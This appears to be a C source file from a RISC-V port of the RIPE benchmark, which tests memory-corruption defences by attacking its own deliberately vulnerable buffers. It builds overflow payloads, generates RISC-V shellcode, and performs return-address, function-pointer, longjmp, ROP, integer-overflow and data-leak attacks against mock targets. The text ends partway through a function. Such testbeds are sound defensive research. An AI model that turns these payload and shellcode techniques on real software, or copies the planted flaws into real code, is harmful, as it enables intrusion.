/*
 * Standalone RISC-V compatible implementation of RIPE
 *
 * Attack params:
 * --------------
 * technique = direct, indirect
 * inject parameter = ret2libc, shellcode injection, ROP, data only
 * code pointer = return address, function pointer, vulnerable struct, longjmp buffer,
 *         non-control data variable
 * location = stack, heap, data, bss
 * function = memcpy, strcpy, strncpy, strcat, strncat, sprintf, snprintf,
 *         sscanf, homebrew memcpy
 */

#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <setjmp.h>
#include <inttypes.h>

#include "ripe_attack_generator.h"

bool output_debug_info = false;
#define print_reason(s) // fprintf(stderr, s)

// shellcode is generated in perform_attack()
static uint8_t shellcode_nonop[12];

#ifndef RIPE_DEF_TECHNIQUE
    #define RIPE_DEF_TECHNIQUE DIRECT
#endif
#ifndef RIPE_DEF_INJECT
    #define RIPE_DEF_INJECT RETURN_ORIENTED_PROGRAMMING
#endif
#ifndef RIPE_DEF_CODE_PTR
    #define RIPE_DEF_CODE_PTR RET_ADDR
#endif
#ifndef RIPE_DEF_LOCATION
    #define RIPE_DEF_LOCATION STACK
#endif
#ifndef RIPE_DEF_FUNCTION
    #define RIPE_DEF_FUNCTION MEMCPY
#endif

// data-only target pointer
uint32_t dop_dest = 0xdeadbeef;

// For RETURN_ORIENTED_PROGRAMMING we skip over the prologue code of
// rop_target() to simulate return-oriented programming gadget
#ifdef __riscv_compressed
  #define PROLOGUE_LENGTH 8
#else
  #define PROLOGUE_LENGTH 16
#endif

static void attack_once(void);
static int attack_wrapper(void);
static int perform_attack(func_t **stack_func_ptr_param,
                          jmp_buf *stack_jmp_buffer_param);
static void dummy_function(void);
static const char *hex_to_bin(char c);
static void hex_to_string(char * str, size_t val);
static void format_instruction(uint8_t *dest, size_t insn);

static const char * const bin4b[16] = {"0000", "0001", "0010", "0011",
                                       "0100", "0101", "0110", "0111",
                                       "1000", "1001", "1010", "1011",
                                       "1100", "1101", "1110", "1111"};

// Do not count for the null terminator since a null in the shellcode will
// terminate any string function in the standard library
static size_t size_shellcode_nonop = sizeof(shellcode_nonop);

/* DATA SEGMENT TARGETS */
/*
Vulnerable struct
Overflow buffers (buffer1 for .data, buffer2 for .sdata)
Arbitrary read data
DOP flag
Two general pointers for indirect attack
Function pointers
Longjmp buffer
*/
static struct attackme data_struct = { "AAAA", &dummy_function };
static char data_buffer1[256] = "d";
static char data_buffer2[8] = "dummy";
static char data_secret[32] = "success. Secret data leaked.\n";
static int data_flag = 0700;
static uint8_t * data_mem_ptr_aux[256] = { (uint8_t *)(uintptr_t)&dummy_function };
static uint8_t * data_mem_ptr[256] = { (uint8_t *)(uintptr_t)&dummy_function };
static func_t * data_func_ptr = &dummy_function;
static jmp_buf data_jmp_buffer = { 1 };

// control data destinations
void
shellcode_target(void);
void
ret2libc_target(void);
void
rop_target(void);
void
dop_target(uint8_t * buf, uint32_t auth);

// integer overflow vulnerability
void
iof(uint8_t * buf, uint32_t iv);

// arbitrary read bug
void
data_leak(uint8_t *buf);

// forces length param to register and jumps before return for stack param attacks
void
homebrew_memcpy_param(void * dst, const void * src, register size_t length);

// longjmp() is called from here
void
lj_func(jmp_buf lj_buf);

// get ret address
// ra written to stack one word higher than bp
#define OLD_BP_PTR   __builtin_frame_address(0)
#define RET_ADDR_PTR ((uintptr_t *) OLD_BP_PTR - 1)

struct attack_form attack;

int
main(int argc, char ** argv)
{
    // Set defaults
    attack.technique = RIPE_DEF_TECHNIQUE;
    attack.inject_param = RIPE_DEF_INJECT;
    attack.code_ptr = RIPE_DEF_CODE_PTR;
    attack.location = RIPE_DEF_LOCATION;
    attack.function = RIPE_DEF_FUNCTION;

#ifndef RIPE_NO_CLI
    if (parse_ripe_params(argc, argv, &attack, &output_debug_info) != 0) {
        fprintf(stderr, "Could not parse command line arguments\n");
        return 1;
    }
#endif
    attack_once();
    return 0;
} /* main */



static void
attack_once(void) {
    if (is_attack_possible()) {
        int ret = attack_wrapper();
        fprintf(stderr, "attack_wrapper() returned %d\n", ret);
        }
}

__attribute__ ((noinline)) // Make sure this function has its own stack frame
static int
attack_wrapper(void) {
    jmp_buf stack_jmp_buffer_param;
    func_t *stack_func_ptr_param = dummy_function;
    return perform_attack(&stack_func_ptr_param, &stack_jmp_buffer_param);
}

/********************/
/* PERFORM_ATTACK() */
/********************/
static int
perform_attack(
    func_t ** stack_func_ptr_param,
    jmp_buf *stack_jmp_buffer_param)
{
    /* STACK TARGETS
        Function Pointer
        Two general pointers for indirect attack
        DOP flag
        Arbitrary read data
        Overflow buffer
        Vulnerable struct
        Long jump buffer
    */
    func_t * stack_func_ptr;
    uint8_t * stack_mem_ptr;
    uint8_t * stack_mem_ptr_aux;
    uint32_t stack_flag;
    char stack_secret[32];
    strcpy(stack_secret, data_secret);
    uint8_t stack_buffer[1024];
    struct attackme stack_struct;
    stack_struct.func_ptr = &dummy_function;
    jmp_buf stack_jmp_buffer;


    /* HEAP TARGETS */
    /*
    Vulnerable struct
    Overflow buffers
    DOP flag
    Two general pointers for indirect attack
    Arbitrary read data
    Function pointer array
    Longjmp buffer
    */
    struct attackme * heap_struct = malloc(sizeof(struct attackme));
    heap_struct->func_ptr = dummy_function;

    /* Two buffers declared to be able to chose buffer that gets allocated    */
    /* first on the heap. The other buffer will be set as a target, i.e. a    */
    /* heap array of function pointers.                                       */
    uint8_t * heap_buffer1 = malloc(256 + sizeof(long));
    uint8_t * heap_buffer2 = malloc(256 + sizeof(long));
    uint8_t * heap_buffer3 = malloc(256 + sizeof(long));

    uint32_t * heap_flag = malloc(sizeof(int *));
    uint8_t * heap_mem_ptr_aux;
    uint8_t * heap_mem_ptr;
    char * heap_secret;
    func_t **heap_func_ptr = NULL;
    jmp_buf * heap_jmp_buffer;

    /* BSS TARGETS */
    /*
    Function pointer
    DOP flag
    Two general pointers for indirect attack
    Arbitrary read data
    Overflow buffer
    Longjmp buffer
    Vulnerable Struct
    */
    static func_t * bss_func_ptr;
    static int * bss_flag;
    static uint8_t * bss_mem_ptr_aux;
    static uint8_t * bss_mem_ptr;
    static char bss_secret[32];
    static uint8_t bss_buffer[256];
    static jmp_buf bss_jmp_buffer;
    static struct attackme bss_struct;

    /* Pointer to buffer to overflow */
    uint8_t * buffer;
    /* Address to target for direct (part of) overflow */
    void * target_addr;
    /* Address for second overflow (indirect ret2libc attack) */
    void * target_addr_aux;
    /* Buffer for storing a generated format string */
    char format_string_buf[16];
    /* Attack payload */
    struct payload payload;

    // assigning value to bss buffers
    //  to place them 'behind' other locals
    bss_buffer[0]  = 'a';
    strcpy(bss_secret, data_secret);

    // write shellcode with correct jump address
    build_shellcode(shellcode_nonop);

    switch (attack.location) {
        case STACK:
            // Special case for stack_struct
            if (attack.code_ptr == STRUCT_FUNC_PTR_STACK &&
              attack.technique == DIRECT)
            {
                buffer = stack_struct.buffer;
            } else {
                buffer = stack_buffer;
            }

            // set up stack ptr with DOP target
            if (attack.inject_param == DATA_ONLY) {
                stack_mem_ptr = (uint8_t *)&stack_flag;
            }

            // Also set the location of the function pointer and the
            // longjmp buffer on the heap (the same since only choose one)
            heap_func_ptr   = (void *) heap_buffer1;
            heap_jmp_buffer = (jmp_buf *) malloc(sizeof(jmp_buf));
            break;
        case HEAP:
            /* Injection into heap buffer                            */

            // Special case for heap_struct
            if (attack.code_ptr == STRUCT_FUNC_PTR_HEAP &&
              attack.technique == DIRECT)
            {
                buffer = heap_struct->buffer;
                break;
            }

            if (((unsigned long) heap_buffer1 < (unsigned long) heap_buffer2) &&
              ((unsigned long) heap_buffer2 < (unsigned long) heap_buffer3))
            {
                buffer = heap_buffer1;
                // Set the location of the memory pointer on the heap
                heap_mem_ptr_aux = heap_buffer2;
                heap_mem_ptr     = heap_buffer3;

                if (attack.code_ptr == VAR_LEAK) {
                    heap_secret = (char *)heap_buffer2;
                    strcpy(heap_secret, data_secret);
                }
                // Also set the location of the function pointer and the
                // longjmp buffer on the heap (the same since only choose one)
                heap_func_ptr = malloc(sizeof(void *));

                // allocate the jump buffer
                heap_jmp_buffer = (int *) malloc(sizeof(jmp_buf));
            } else {
                if (output_debug_info) {
                    fprintf(stderr,
                      "Error: Heap buffers allocated in the wrong order.\n");
                }

                exit(1);
            }

            // set up heap ptr with DOP target
            if (attack.inject_param == DATA_ONLY) {
                heap_mem_ptr = (uint8_t *)heap_flag;
            }
            break;
        case DATA:
            /* Injection into data segment buffer                    */

            // Special case for stack_struct
            if (attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
                buffer = data_struct.buffer;
                break;
            }

            if ((attack.code_ptr == FUNC_PTR_DATA ||
              attack.code_ptr == VAR_BOF) &&
              attack.technique == DIRECT)
            {
                buffer = data_buffer2;
            } else {
                buffer = data_buffer1;
            }

            // set up data ptr with DOP target
            if (attack.inject_param == DATA_ONLY) {
                data_flag     = 0;
                *data_mem_ptr = (uint8_t *)&data_flag;
            }
            // Also set the location of the function pointer and the
            // longjmp buffer on the heap (the same since only choose one)
            heap_func_ptr   = (func_t *)(uintptr_t)heap_buffer1;
            heap_jmp_buffer = (jmp_buf *)heap_buffer1;
            break;
        case BSS:
            /* Injection into BSS buffer                             */

            // Special case for bss_struct
            if (attack.code_ptr == STRUCT_FUNC_PTR_BSS) {
                buffer = bss_struct.buffer;
                break;
            }

            buffer = bss_buffer;

            bss_flag = 0;

            bss_mem_ptr_aux = (uint8_t*)(uintptr_t)&dummy_function;
            bss_mem_ptr     = (uint8_t*)(uintptr_t)&dummy_function;

            // set up bss ptr with DOP target
            if (attack.inject_param == DATA_ONLY) {
                bss_mem_ptr = (uint8_t *)&bss_flag;
            }
            // Also set the location of the function pointer on the heap
            heap_func_ptr = (func_t *)(uintptr_t)heap_buffer1;
            break;
    }

    // make sure we actually have an initialized function pointer on the heap
    if (heap_func_ptr)
        *heap_func_ptr = dummy_function;

    // Set Target Address
    switch (attack.technique) {
        case DIRECT:
            switch (attack.code_ptr) {
                case RET_ADDR:
                    target_addr = RET_ADDR_PTR;
                    break;
                case FUNC_PTR_STACK_VAR:
                    target_addr = &stack_func_ptr;
                    break;
                case FUNC_PTR_STACK_PARAM:
                    target_addr = &stack_func_ptr_param;
                    break;
                case FUNC_PTR_HEAP:
                    target_addr = heap_func_ptr;
                    break;
                case FUNC_PTR_BSS:
                    target_addr = &bss_func_ptr;
                    break;
                case FUNC_PTR_DATA:
                    target_addr = &data_func_ptr;
                    break;
                case LONGJMP_BUF_STACK_VAR:
                    target_addr = stack_jmp_buffer;
                    break;
                case LONGJMP_BUF_STACK_PARAM:
                    target_addr = stack_jmp_buffer_param;
                    break;
                case LONGJMP_BUF_HEAP:
                    break;
                case LONGJMP_BUF_DATA:
                    target_addr = data_jmp_buffer;
                    break;
                case LONGJMP_BUF_BSS:
                    target_addr = bss_jmp_buffer;
                    break;
                case STRUCT_FUNC_PTR_STACK:
                    target_addr = &stack_struct.func_ptr;
                    break;
                case STRUCT_FUNC_PTR_HEAP:
                    break;
                case STRUCT_FUNC_PTR_DATA:
                    target_addr = &data_struct.func_ptr;
                    break;
                case STRUCT_FUNC_PTR_BSS:
                    target_addr = &bss_struct.func_ptr;
                    break;
                case VAR_BOF:
                // if data-only, location determines target
                case VAR_IOF:
                    switch (attack.location) {
                        case STACK:
                            target_addr = &stack_flag;
                            break;
                        case HEAP:
                            target_addr = heap_flag;
                            break;
                        case DATA:
                            target_addr = &data_flag;
                            break;
                        case BSS:
                            target_addr = &bss_flag;
                            break;
                    }
                    break;
                case VAR_LEAK:
                    switch (attack.location) {
                        case STACK:
                            target_addr = &stack_secret;
                            break;
                        case HEAP:
                            target_addr = heap_secret;
                            break;
                        case DATA:
                            target_addr = &data_secret;
                            break;
                        case BSS:
                            target_addr = &bss_secret;
                            break;
                    }
                    break;
            }
            break;

        case INDIRECT:
            switch (attack.location) {
                case STACK:
                    target_addr     = &stack_mem_ptr;
                    target_addr_aux = &stack_mem_ptr_aux;
                    break;
                case HEAP:
                    target_addr     = heap_mem_ptr;
                    target_addr_aux = heap_mem_ptr_aux;
                    break;
                case DATA:
                    target_addr     = &data_mem_ptr;
                    target_addr_aux = &data_mem_ptr_aux;
                    break;
                case BSS:
                    target_addr     = &bss_mem_ptr;
                    target_addr_aux = &bss_mem_ptr_aux;
                    break;
            }
            break;
    }

    // set longjmp buffers
    switch (attack.code_ptr) {
        case LONGJMP_BUF_STACK_VAR:
            if (setjmp(stack_jmp_buffer) != 0) {
                /* setjmp() returns 0 if returning directly and non-zero when returning */
                /* from longjmp() using the saved context. Attack failed.               */
                printf("Longjmp attack failed. Returning normally...\n");
                return 1;
            }
            payload.jmp_buffer = &stack_jmp_buffer;
            break;
        case LONGJMP_BUF_STACK_PARAM:
            if (setjmp(*stack_jmp_buffer_param) != 0) {
                printf("Longjmp attack failed. Returning normally...\n");
                return 1;
            }
            // jmp_buf is an array type and thus degenerates on passing as parameter.
            // To avoid a warning here we have to jump through this weird hoop.
            payload.jmp_buffer = &(stack_jmp_buffer_param[0]);
            break;
        case LONGJMP_BUF_HEAP:
            if (setjmp(*heap_jmp_buffer) != 0) {
                printf("Longjmp attack failed. Returning normally...\n");
                return 1;
            }
            payload.jmp_buffer = (void *) heap_jmp_buffer;
            break;
        case LONGJMP_BUF_DATA:
            if (setjmp(data_jmp_buffer) != 0) {
                printf("Longjmp attack failed. Returning normally...\n");
                return 1;
            }
            payload.jmp_buffer = (void *) data_jmp_buffer;
            break;
        case LONGJMP_BUF_BSS:
            if (setjmp(bss_jmp_buffer) != 0) {
                printf("Longjmp attack failed. Returning normally...\n");
                return 1;
            }
            payload.jmp_buffer = (void *) bss_jmp_buffer;
            break;
        default:
            break;
    }

    payload.ptr_to_correct_return_addr = RET_ADDR_PTR;

    payload.inject_param = attack.inject_param;

    switch (attack.technique) {
        case DIRECT:
            switch (attack.inject_param) {
                case RETURN_INTO_LIBC:
                    // simulate ret2libc by invoking mock libc function
                    payload.overflow_ptr = (void *)(uintptr_t)&ret2libc_target;
                    break;
                case RETURN_ORIENTED_PROGRAMMING:
                    payload.overflow_ptr = (void *)((uintptr_t)&rop_target + PROLOGUE_LENGTH);
                    break;
                case INJECTED_CODE_NO_NOP:
                    payload.overflow_ptr = buffer;
                    break;
                case DATA_ONLY:
                    // corrupt variable with nonzero value
                    payload.overflow_ptr = (void *)0xdeadbeef;
                    break;
                default:
                    if (output_debug_info) {
                        fprintf(stderr, "Unknown choice of attack code");
                        exit(1);
                    }
            }
            break;
        case INDIRECT:
            /* Here payload.overflow_ptr will point to the final pointer target   */
            /* since an indirect attack first overflows a general pointer that in */
            /* turn is dereferenced to overwrite the target pointer               */
            switch (attack.code_ptr) {
                case RET_ADDR:
                    payload.overflow_ptr = RET_ADDR_PTR;
                    break;
                case FUNC_PTR_STACK_VAR:
                    payload.overflow_ptr = &stack_func_ptr;
                    break;
                case FUNC_PTR_STACK_PARAM:
                    payload.overflow_ptr = &stack_func_ptr_param;
                    break;
                case FUNC_PTR_HEAP:
                    payload.overflow_ptr = (void *)(uintptr_t)heap_func_ptr;
                    break;
                case FUNC_PTR_BSS:
                    payload.overflow_ptr = &bss_func_ptr;
                    break;
                case FUNC_PTR_DATA:
                    payload.overflow_ptr = &data_func_ptr;
                    break;
                case STRUCT_FUNC_PTR_STACK:
                    payload.overflow_ptr = &stack_struct.func_ptr;
                    break;
                case STRUCT_FUNC_PTR_HEAP:
                    payload.overflow_ptr = heap_struct + 256;
                    break;
                case STRUCT_FUNC_PTR_DATA:
                    payload.overflow_ptr = &data_struct.func_ptr;
                    break;
                case STRUCT_FUNC_PTR_BSS:
                    payload.overflow_ptr = &bss_struct.func_ptr;
                    break;
                case LONGJMP_BUF_STACK_VAR:
                    payload.overflow_ptr = stack_jmp_buffer;
                    break;
                case LONGJMP_BUF_STACK_PARAM:
                    payload.overflow_ptr = stack_jmp_buffer_param;
                    break;
                case LONGJMP_BUF_HEAP:
                    payload.overflow_ptr = *heap_jmp_buffer;
                    break;
                case LONGJMP_BUF_DATA:
                    payload.overflow_ptr = data_jmp_buffer;
                    break;
                case LONGJMP_BUF_BSS:
                    payload.overflow_ptr = bss_jmp_buffer;
                    break;
                // indirect attacks don't apply to int overflows or leaks
                case VAR_BOF:
                case VAR_IOF:
                case VAR_LEAK:
                    payload.overflow_ptr = &dop_dest;
                    break;
                default:
                    if (output_debug_info) {
                        fprintf(stderr,
                          "Error: Unknown choice of code pointer\n");
                    }

                    exit(1);
                    break;
            }
            break;
    }

    if (output_debug_info) {
        fprintf(stderr, "target_addr == %p\n", target_addr);
        fprintf(stderr, "buffer == %p\n", buffer);
    }

    // ------------------------------------------------------
    /* Calculate payload size for overflow of chosen target address */
    if ((uintptr_t) target_addr > (uintptr_t) buffer) {
        payload.size =
          (unsigned int) ((unsigned long) target_addr + sizeof(long)
          - (unsigned long) buffer
          + 1); /* For null termination so that buffer can be     */
                /* used with string functions in standard library */

        if (output_debug_info)
            fprintf(stderr, "payload size == %zd\n", payload.size);
    } else {
        if (output_debug_info)
            fprintf(stderr, "Error calculating size of payload\n");
        exit(1);
    }

    /* Set first byte of buffer to null to allow concatenation functions to */
    /* start filling the buffer from that first byte                        */
    buffer[0] = '\0';

    if (!build_payload(&payload)) {
        if (output_debug_info)
            fprintf(stderr, "Error: Could not build payload\n");
        exit(1);
    }

    /****************************************/
    /* Overflow buffer with chosen function */
    /* Note: Here memory will be corrupted  */
    /****************************************/

    switch (attack.function) {
        case MEMCPY:
            // memcpy() shouldn't copy the terminating NULL, therefore - 1
            memcpy(buffer, payload.buffer, payload.size - 1);
            break;
        case STRCPY:
            strcpy((char *)buffer, payload.buffer);
            break;
        case STRNCPY:
            strncpy((char *)buffer, payload.buffer, payload.size);
            break;
        case SPRINTF:
            sprintf((char *)buffer, "%s", payload.buffer);
            break;
        case SNPRINTF:
            snprintf((char *)buffer, payload.size, "%s", payload.buffer);
            break;
        case STRCAT:
            strcat((char *)buffer, payload.buffer);
            break;
        case STRNCAT:
            strncat((char *)buffer, payload.buffer, payload.size);
            break;
        case SSCANF:
            snprintf(format_string_buf, 15, "%%%ic", payload.size);
            sscanf(payload.buffer, format_string_buf, buffer);
            break;
        case HOMEBREW:
            homebrew_memcpy(buffer, payload.buffer, payload.size - 1);
            break;
        default:
            if (output_debug_info)
                fprintf(stderr, "Error: Unknown choice of function\n");
            exit(1);
            break;
    }

    /*******************************************/
    /* Ensure that code pointer is overwritten */
    /*******************************************/

    switch (attack.technique) {
        case DIRECT:
            /* Code pointer already overwritten */
            break;
        case INDIRECT:
            // zero out junk byte written to general pointer
            if (attack.function == SSCANF) {
                *(uint32_t *) target_addr <<= 8;
                *(uint32_t *) target_addr >>= 8;
            }

            if (attack.inject_param == RETURN_INTO_LIBC) {
                // auxilliary overflow to give attacker control of a second general ptr
                payload.overflow_ptr = (void *)(uintptr_t)&ret2libc_target;
                payload.size         = (uintptr_t) target_addr_aux
                  - (uintptr_t) buffer + sizeof(long) + 1;
                build_payload(&payload);
                memcpy(buffer, payload.buffer, payload.size - 1);
                printf("target_addr_aux: %p\n", target_addr_aux);

                switch (attack.location) {
                    case STACK:
                        *(uint32_t *) (*(uint32_t *) target_addr) =
                          (uintptr_t) stack_mem_ptr_aux;
                        break;
                    case HEAP:
                        *(uint32_t *) (*(uint32_t *) target_addr) =
                          (uintptr_t) *heap_mem_ptr_aux;
                        break;
                    case DATA:
                        *(uint32_t *) (*(uint32_t *) target_addr) =
                          (uintptr_t) *data_mem_ptr_aux;
                        break;
                    case BSS:
                        *(uint32_t *) (*(uint32_t *) target_addr) =
                          (uintptr_t) bss_mem_ptr_aux;
                        break;
                }
            } else if (attack.inject_param == INJECTED_CODE_NO_NOP) {
                *(uintptr_t *) (*(uintptr_t *) target_addr) =
                  (uintptr_t) buffer;
            }
            break;
        default:
            if (output_debug_info)
                fprintf(stderr, "Error: Unknown choice of attack parameterB\n");

            exit(1);
            break;
    }

    printf("");
    printf("\nExecuting attack... ");

    switch (attack.code_ptr) {
        case RET_ADDR:
            break;
        case FUNC_PTR_STACK_VAR:
            stack_func_ptr();
            break;
        case FUNC_PTR_STACK_PARAM:
            (*stack_func_ptr_param)();
            break;
        case FUNC_PTR_HEAP:
            (*heap_func_ptr)();
            break;
        case FUNC_PTR_BSS:
            (*bss_func_ptr)();
            break;
        case FUNC_PTR_DATA:
            (*data_func_ptr)();
            break;
        case LONGJMP_BUF_STACK_VAR:
            lj_func(stack_jmp_buffer);
            break;
        case LONGJMP_BUF_STACK_PARAM:
            lj_func(*stack_jmp_buffer_param);
            break;
        case LONGJMP_BUF_HEAP:
            lj_func(*heap_jmp_buffer);
            break;
        case LONGJMP_BUF_DATA:
            lj_func(data_jmp_buffer);
            break;
        case LONGJMP_BUF_BSS:
            lj_func(bss_jmp_buffer);
            break;
        case STRUCT_FUNC_PTR_STACK:
            (*stack_struct.func_ptr)();
            break;
        case STRUCT_FUNC_PTR_HEAP:
            (*heap_struct->func_ptr)();
            break;
        case STRUCT_FUNC_PTR_DATA:
            (*data_struct.func_ptr)();
            break;
        case STRUCT_FUNC_PTR_BSS:
            (*bss_struct.func_ptr)();
            break;
        case VAR_BOF:
        case VAR_IOF:
            switch (attack.location) {
                case STACK:
                    dop_target(buffer, *stack_mem_ptr);
                    break;
                case HEAP:
                    dop_target(buffer, *heap_mem_ptr);
                    break;
                case DATA:
                    dop_target(buffer, **data_mem_ptr);
                    break;
                case BSS:
                    dop_target(buffer, *bss_mem_ptr);
                    break;
            }
            break;
        case VAR_LEAK:
            data_leak(buffer);
            break;
    }
    return 1;
} /* perform_attack */

/*******************/
/* BUILD_PAYLOAD() */
/*******************/
bool
build_payload(struct payload * payload)
{
    size_t size_shellcode, bytes_to_pad;
    char * shellcode, * temp_char_buffer, * temp_char_ptr;
    
    switch (attack.inject_param) {
        case INJECTED_CODE_NO_NOP:
            if (payload->size < (size_shellcode_nonop + sizeof(func_t*))) {
                return false;
            }
            shellcode      = shellcode_nonop;
            size_shellcode = size_shellcode_nonop;
            break;
        case DATA_ONLY:
            // 256 padding bytes for unsigned 8bit IOF
            if (attack.code_ptr == VAR_IOF)
                payload->size = 256 + sizeof(long) + sizeof(char);
            
            if (attack.code_ptr == VAR_LEAK) {
                // simulated packet with length included
                payload->size += 32 - sizeof(long);
                payload->buffer[0] = payload->size & 0xFF;
                payload->buffer[1] = payload->size / 0x100;
                payload->buffer[2] = 'A';
                payload->buffer[3] = '\0';
                payload->size = 4;
                return true;
            } /* else fall through */
        case RETURN_ORIENTED_PROGRAMMING:
        case RETURN_INTO_LIBC:
            if (payload->size < sizeof(long))
                return false;

            size_shellcode = 0;
            shellcode      = "dummy";
            break;
    }
    /* Allocate payload buffer */
    payload->buffer = malloc(payload->size);

    /* Copy shellcode into payload buffer */
    memcpy(payload->buffer, shellcode, size_shellcode);

    /* Calculate number of bytes to pad with */
    /* size - shellcode - target address - null terminator */
    bytes_to_pad =
      (payload->size - size_shellcode - sizeof(void *) - sizeof(char));

    /* Pad payload buffer with dummy bytes */
    memset((payload->buffer + size_shellcode), 'A', bytes_to_pad);

    if (output_debug_info) {
        fprintf(stderr, "bytes to pad: %zd\n", bytes_to_pad);
        fprintf(stderr, "\noverflow_ptr: %p\n", payload->overflow_ptr);
    }

    /* Add the address to the direct or indirect target */
    if (attack.code_ptr != VAR_IOF) {
        memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
          &payload->overflow_ptr,
          sizeof(void *));
    }

    /* Finally, add the terminating null character at the end */
    memset((payload->buffer + payload->size - 1), '\0', 1);
    
    if (output_debug_info)
        fprintf(stderr, "payload: %s\n", payload->buffer);
    return true;

} /* build_payload */

static void
dummy_function(void) {
    printf("Dummy function\n");
}

// call longjmp on a buffer in perform_attack()
void
lj_func(jmp_buf lj_buf)
{
    longjmp(lj_buf, 1111);
}

void
homebrew_memcpy(void * dst, const void * src, size_t length)
{
    char * d, * s;

    d = (char *) dst;
    s = (char *) src;

    while (length--) {
        *d++ = *s++;
    }
}

void
shellcode_target()
{
    printf("success.\nCode injection function reached.\n");
    exit(0);
}

void
ret2libc_target()
{
    printf("success.\nRet2Libc function reached.\n");
    exit(0);
}

void
dop_target(uint8_t * buf, uint32_t auth)
{
    size_t auth_loc = auth;

    if (attack.code_ptr == VAR_IOF) {
        iof(buf, (uintptr_t)&auth_loc);
    }

    if (!auth_loc) {
        printf("DOP attack failed\n");
    } else {
        printf("success.\nDOP memory corruption reached.\n");
        exit(0);
    }
}

__attribute__ ((optimize (0))) // Make sure prologue length does not change
void
rop_target(void)
{
    printf("success.\nROP function reached.\n");
    exit(0);
}

void
iof(uint8_t * buf, uint32_t iv)
{
    char * map;
    uint32_t key = iv;
    size_t len  = strlen((char *)buf);

    // 0-length allocation and vulenrable hash operations
    map      = malloc(len * sizeof(uint8_t));
    key     -= (uintptr_t) map;
    key     &= (uint16_t) len - 1;
    map[key] = 0xa1;
}

void
data_leak(uint8_t *buf) {
    uint16_t size = buf[0] + (buf[1] * 0x100), i;
    uint8_t *msg = malloc(size);

    memcpy(msg, buf + 2, size);
    for (i = 0; i < size; i++) {
        if (msg[i] >= 0x20) putc(msg[i],stdout);
    }

    putc('\n', stdout);
}           

/*********************/
/* BUILD_SHELLCODE() */
/*********************/
void
build_shellcode(uint8_t * shellcode)
{
    char attack_addr[9], low_bits[4], high_bits[6];  // target address and its components
    // fix shellcode when lower bits would become negative
    if (((uintptr_t)&shellcode_target & 0x00000fff) >= 0x800)
        hex_to_string(attack_addr, (uintptr_t)&shellcode_target + 0x1000);
    else
        hex_to_string(attack_addr, (uintptr_t)&shellcode_target);

    // split attack address into low and high bit strings
    strncpy(low_bits, &attack_addr[5], 3);
    low_bits[3] = '\0'; // unnecessary (unlike below)
    strncpy(high_bits, attack_addr, 5);
    high_bits[5] = '\0';

    char lui_bin[33], addi_bin[33]; // binary insn encodings (as strings)
    lui_bin[0] = '\0';
    addi_bin[0] = '\0';

    // generate 20 imm bits for the LUI insn
    for (int i = 0; i < 5; i++) {
        strncat(lui_bin, hex_to_bin(high_bits[i]), 4);
    }

    uint32_t lui_val, addi_val, jalr_val = 0x000300e7; // raw binary insn encodings
    // append reg and opcode bits, then convert to raw binary
    strncat(lui_bin, "001100110111", 12);
    lui_val = strtoul(lui_bin, 0, 2);

    // generate binary for ADDI insn
    for (int i = 0; i < 3; i++) {
        strncat(addi_bin, hex_to_bin(low_bits[i]), 4);
    }

    strncat(addi_bin, "00110000001100010011", 20);
    addi_val = strtoul(addi_bin, 0, 2);

    format_instruction(shellcode, lui_val);
    format_instruction(shellcode + 4, addi_val);
    format_instruction(shellcode + 8, jalr_val);

    char lui_s[9], addi_s[9]; // hex insn encodings
    hex_to_string(lui_s, lui_val);
    lui_s[8] = '\0';
    hex_to_string(addi_s, addi_val);
    addi_s[8] = '\0';

    if (output_debug_info) {
        printf("----------------\nShellcode instructions:\n");
        printf("%s0x%-20s%14s\n", "lui t1,  ", high_bits, lui_s);
        printf("%s0x%-20s%10s\n", "addi t1, t1, ", low_bits, addi_s);
        printf("%s%30s%08"PRIx32"\n", "jalr t1", " ", jalr_val);
    }
} /* build_shellcode */

static const char *
hex_to_bin(char c) {
    if (c >= '0' && c <= '9')
        return bin4b[c - '0'];
    if (c >= 'a' && c <= 'f')
        return bin4b[10 + c - 'a'];
    return NULL;
}

// convert a 32-bit hex value to 0-padded, 8-char string
static void
hex_to_string(char * str, size_t val)
{
    snprintf(str, 9, "%08zx", val);
}

// format instruction and append to destination string
static void
format_instruction(uint8_t * dest, size_t insn)
{
    uint8_t insn_bytes[4];

    insn_bytes[0] = (insn >> 24) & 0xff;
    insn_bytes[1] = (insn >> 16) & 0xff;
    insn_bytes[2] = (insn >> 8) & 0xff;
    insn_bytes[3] = insn & 0xff;

    for (int i = 3; i >= 0; i--) {
        dest[3 - i] = insn_bytes[i];
    }
}

bool
is_attack_possible()
{
    if ((attack.inject_param == INJECTED_CODE_NO_NOP) &&
      (!(attack.function == MEMCPY) && !(attack.function == HOMEBREW)))
    {
        print_reason("Error: Impossible to inject shellcode with string functions (for now)\n");
        return false;
    }

    if (attack.inject_param == RETURN_ORIENTED_PROGRAMMING &&
      attack.technique != DIRECT)
    {
        print_reason("Error: Impossible (theoretically) to perform indirect ROP attacks\n");
        return false;
    }

    if (attack.inject_param == DATA_ONLY) {
        if (attack.code_ptr != VAR_BOF &&
            attack.code_ptr != VAR_IOF &&
            attack.code_ptr != VAR_LEAK)
        {
            print_reason("Error: Misused DOP code pointer parameters.\n");
            return false;
        }

        if ((attack.code_ptr == VAR_LEAK || attack.code_ptr == VAR_IOF) && attack.technique == INDIRECT) {
            print_reason("Error: Impossible to do an indirect int overflow attack.\n");
            return false;
        }

        if (attack.location == HEAP && attack.technique == INDIRECT) {
            print_reason("Error: Impossible to indirect attack the heap flag.\n");
            return false;
        }
    } else if (attack.code_ptr == VAR_BOF ||
               attack.code_ptr == VAR_IOF ||
               attack.code_ptr == VAR_LEAK) {
        print_reason("Error: Must use \"dataonly\" injection parameter for DOP attacks.\n");
        return false;
    }

    // attacks targeting another memory location must be indirect
    switch (attack.location) {
        case STACK:
            if ((attack.technique == DIRECT)) {
                if ((attack.code_ptr == FUNC_PTR_HEAP) ||
                  (attack.code_ptr == FUNC_PTR_BSS) ||
                  (attack.code_ptr == FUNC_PTR_DATA) ||
                  (attack.code_ptr == LONGJMP_BUF_HEAP) ||
                  (attack.code_ptr == LONGJMP_BUF_DATA) ||
                  (attack.code_ptr == LONGJMP_BUF_BSS) ||
                  (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
                  (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
                  (attack.code_ptr == STRUCT_FUNC_PTR_BSS) )
                {
